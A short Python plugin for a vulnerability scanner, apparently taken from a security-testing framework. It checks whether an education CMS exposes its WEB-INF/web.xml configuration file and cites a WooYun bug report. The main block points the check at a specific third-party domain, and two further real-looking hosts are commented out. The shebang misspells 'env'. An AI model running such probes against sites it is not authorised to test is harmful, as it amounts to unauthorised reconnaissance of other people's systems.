#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:北京师科阳光信息技术cms默认配置不当，导致信息泄漏
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0103605

def assign(service,arg):
    if service=="edutech":
        return True,arg 
    
def  audit(arg):
    url=arg+"WEB-INF/web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<servlet-mapping>" in res:
        security_hole(url)
    

if __name__=="__main__":
    from dummy import *
    audit(assign('edutech','http://www.javadev.cn/')[1])
    # audit(assign('edutech','http://www.tazyjsxx.com:85/')[1])
    # audit(assign('edutech','http://58.130.240.247/')[1])